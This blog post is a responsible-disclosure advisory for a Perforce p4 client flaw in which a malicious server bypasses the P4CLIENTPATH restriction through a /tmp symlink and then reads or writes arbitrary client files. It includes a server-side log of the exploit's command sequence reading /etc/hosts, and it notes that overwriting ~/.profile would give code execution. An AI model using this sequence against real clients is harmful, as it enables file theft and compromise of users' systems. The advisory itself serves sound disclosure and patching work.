---
layout: post
title: Perforce - Helix Command-Line Client P4CLIENTPATH  Leading to Arbitrary File Read / Write
category: bugreports
---

The `p4` Helix Command-Line Client uses the optional `P4CLIENTPATH` environment variable to restrict directories to which the application permitted to read or write files. This configuration can be trivially bypassed allowing a malicious Perforce server to read or write arbitrary files on the client system.

<!--more-->

*Patch notes resulting from this bug report be viewed at [https://www.perforce.com/perforce/r19.1/user/relnotes.txt](https://www.perforce.com/perforce/r19.1/user/relnotes.txt) #1810430 (Bug #98540)*

<pre class="bugreport">
Description:       Helix Command-Line Client P4CLIENTPATH  Leading to Arbitrary File Read / Write
Versions Affected: 2014.1 through 2019.1 Patch 1
Category:          Arbitrary File Read / Write
Reporter:          Alex Chapman

Summary:
--------
The `p4` Helix Command-Line Client uses the optional `P4CLIENTPATH` environment variable to restrict directories to which the application is permitted to read or write files. This configuration can be trivially bypassed allowing a malicious Perforce server to read or write arbitrary files on the client system.

Details:
--------
The optional `P4CLIENTPATH` environment variable is meant to restrict directories to which the `p4` client application is permitted to read or write files. No matter the value of the environment variable, the client is permitted to write files to the `/tmp` directory, and there is no restriction on creating symbolic links.

Since the `p4` Helix Command-Line Client responds to arbitrary server commands, including the `client-WriteFile` and `client-SendFile` commands, a malicious Perforce server can create a symbolic link to the root directory from the `/tmp` directory (using the `client-WriteFile` command) in order to disclose the contents of arbitrary files from the client system, or write arbitrary files to the client system. 

Analysis:
---------
Exploitation of this vulnerability allows a malicious server to write arbitrary data to any file path accessible to the user running the `p4` client, regardless of the `P4CLIENTPATH` configuration. As an example of exploiting this issue, overwriting a `~/.profile` on *nix base systems would allow for Remote Code Execution when the user next starts a shell. Alternatively, a malicious server can request the client send the contents of arbitrary files, potentially disclosing sensitive client information.

This issue could be exploited in several ways, including:
1. Abusing CI/CD systems which allow users to specify arbitrary Perforce servers from which to obtain source
2. Intercepting non-TLS encrypted p4 connections on untrusted networks (e.g. Public Wifi)
3. Convincing users through the use of social engineering techniques to connect to a malicious Perforce server

In order to remediate this issue the creation of Symbolic Links should be restricted when the `P4CLIENTPATH` environment variable is configured.

Proof of Concept:
-----------------
See the Proof of Concept Python3 script at ***redacted***. Below is the server side output of this script when a p4 client connects using the `./p4 -p &lt;server_address&gt;:&lt;server_port&gt; login` command with the `P4CLIENTPATH` environment variable set to `/home/user/p4/`. This output shows the contents of the clients `/etc/host` file being sent to the server.

# python3 server.py 1667
p4server listening on 0.0.0.0:1667
Received connection
 &lt; Receiving commands
protocol(cmpfile='', client='85', api='99999', enableStreams='', enableGraph='', expandAndmaps='', host='ubuntu', port='perforce.example.com:1667', sndbuf='319487', rcvbu
f='319488')
 &gt; Sending commands
protocol(xfiles='7', server='3', server2='46', serverID='master', revver='9', tzoffset='0', security='3', sndbuf='34559', rcvbuf='280800', autoTune='1')
 &gt; Sending commands
client-Ping()
 &lt; Receiving commands
user-login(version='2018.2/LINUX26X86_64/1751184', autoLogin='', prog='p4', client='ubuntu', cwd='/home/user/p4', host='ubuntu', os='UNIX', user='user
', charset='1', clientCase='0')
 &gt; Sending commands
client-OpenFile(path='/tmp/symlink', type='400', handle='sync')
 &gt; Sending commands
client-WriteFile(data='/\n', handle='sync')
 &gt; Sending commands
client-CloseFile(data='', commit='', handle='sync')
 &gt; Sending commands
client-SendFile(handle='0', path='/tmp/symlink/etc/hosts', open='open_file_result', write='read_file_result', confirm='confirm', decline='decline')
 &gt; Sending commands
release()
 &lt; Receiving commands
dm-Ping()
 &lt; Receiving commands
open_file_result(fileSize='232', handle='0', path='/tmp/symlink/etc/hosts', open='open_file_result', write='read_file_result', confirm='confirm', decline='decline')
 &lt; Receiving commands
read_file_result(data='127.0.0.1\tlocalhost\n127.0.1.1\tubuntu\n...', handle='0')
Contents of '/tmp/symlink/etc/hosts':
        127.0.0.1       localhost
        127.0.1.1       ubuntu

        # The following lines are desirable for IPv6 capable hosts
        ::1     ip6-localhost ip6-loopback
        fe00::0 ip6-localnet
        ff00::0 ip6-mcastprefix
        ff02::1 ip6-allnodes
        ff02::2 ip6-allrouters

 &lt; Receiving commands
confirm(data='', fileSize='232', digest='0991B6FEC21002CDCA46AA738B3BBDA6', time='1568203510', handle='0', path='/tmp/symlink/etc/hosts', open='open_file_result', write='rea
d_file_result', confirm='confirm', decline='decline')
 &lt; Receiving commands
release2()

Timeline
--------
20190423 - Supplied perforce with vulnerability details
20190423 - Initial vendor response and request for more information
20190423 - Further information supplied
20190425 - Issue Confirmed
20190903 - Patch issued Perforce #1810430 (Bug #98540)
</pre>
